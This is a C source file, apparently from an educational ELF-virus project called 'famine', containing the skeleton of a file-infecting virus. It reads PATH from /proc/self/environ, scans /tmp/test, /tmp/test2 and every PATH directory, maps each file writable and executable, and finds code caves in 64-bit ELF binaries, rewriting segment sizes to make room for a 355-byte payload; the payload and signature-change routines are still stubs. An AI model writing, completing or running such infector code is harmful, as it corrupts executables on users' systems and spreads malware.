//
// Created by Joris GOUNAND on 11/9/19.
//
#include "../inc/famine.h"

int magic = 0;
char env[1024];
		// 1 => changement signature
void change_signature(void)
{
	//changement signature
}

size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}

int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);
	if ((fd = open("/proc/self/environ",O_RDONLY,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
		content[j] = '\0';
		close(fd);
	return (content[0] != '\0');
}

int     open_map(char *fname, t_file *file)
{
	struct stat stat;
	if ((file->fd = open (fname, O_APPEND | O_RDWR, 0)) < 0)
		return 1;
	if (fstat(file->fd,&stat) == -1)
		return 1;
	file->size = stat.st_size;
	if ((file->data = mmap(0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
	                       MAP_SHARED, file->fd, 0)) == MAP_FAILED)
		return 1;
	return 0;
}

int out_of_range(t_file *file, void * ptr)
{
	if (ptr < (void *)file->data || ptr > (void *)file->data + file->size)
		return (EXIT_FAILURE);
	return (EXIT_SUCCESS);
}

t_cave *get_gap(t_file *file, t_cave *cave)
{
	size_t payload = 355; // a changer selon la taille
	Elf64_Ehdr*             elf_hdr;
	Elf64_Phdr*             seg;
	int                     i;

	elf_hdr = (Elf64_Ehdr *) file->data;
	seg = (Elf64_Phdr *)((unsigned char*) elf_hdr + (unsigned int)elf_hdr->e_phoff);
	bzero(cave, sizeof(t_cave));
	file->error = 1;
	i = 0;
	while (i < elf_hdr->e_phnum)
	{
		if (out_of_range(file, seg))
			return(cave);
		/* Search Segment PT_LOAD with permission R X*/
		if (file->error && seg->p_type == PT_LOAD && seg->p_flags & (PF_X | PF_R))
		{
			cave->start_seg = seg;
			cave->start_gap = seg->p_offset + seg->p_filesz;
			seg = (Elf64_Phdr *) ((unsigned char*) seg + (unsigned int) elf_hdr->e_phentsize);
			/* DIFF beewten 2 segments > size payload*/
			if (i + 1 < elf_hdr->e_phnum && seg->p_type == PT_LOAD && ((seg->p_offset - cave->start_gap) > payload))
			{
				file->error = 0;
				cave->start_seg->p_memsz += payload;
				cave->start_seg->p_filesz += payload;
			}
		}
		else
			seg = (Elf64_Phdr *) ((unsigned char*)seg + (unsigned int)elf_hdr->e_phentsize);
		++i;
	}
	return(cave);
}

int do_the_job(t_file *file)
{
	t_cave cave;
	if (file->size < sizeof(Elf64_Ehdr))
		return (1);
	if (strncmp(file->data, ELFMAG,SELFMAG))
		return 1;
	if (file->data[EI_CLASS] != ELFCLASS64)
		return 1;
	get_gap(file,&cave);
	if (file->error)
		return 1;
	return 0;
}

int open_directory(const char *path)
{
	t_file file;
	char path_file[256];
	DIR* rep = NULL;
	struct dirent* dirent;
	printf("directory: '%s'\n",path);
	if ((rep = opendir(path)) == NULL)
		return 1;
	while((dirent = readdir(rep)))
	{
		size_t len;
		len = ft_strlen(path);
		memmove(path_file,path,len);
		path_file[len] = '/';
		memmove(path_file + len + 1,dirent->d_name, ft_strlen(dirent->d_name));
		path_file[len + 1 + ft_strlen(dirent->d_name)] = '\0';
		//printf("%s %s\n",dirent->d_name,path_file);
		if (open_map(path_file,&file) == 0)
		{
			do_the_job(&file);
			close(file.fd);
			munmap(file.data, file.size);
		}

	}
	return (0);
}

int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			open_directory(&path[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}


//BSS:
//UN MAGIC NUMBER
//UN BUFFER POUR LE PATH
//UN BUFFER POUR LE READ
int virus(void)
{
	if (magic == 1)
		change_signature();
	printf("virus\n");
	char path[256];
	memmove(path,"/tmp/test:/tmp/test2:",21);
	printf("content: %s\n",path);

	get_env_var("PATH=",path + 21,256 - 21);
	infect(path, 256);
	printf("content: %s\n",path);
	return (0);
}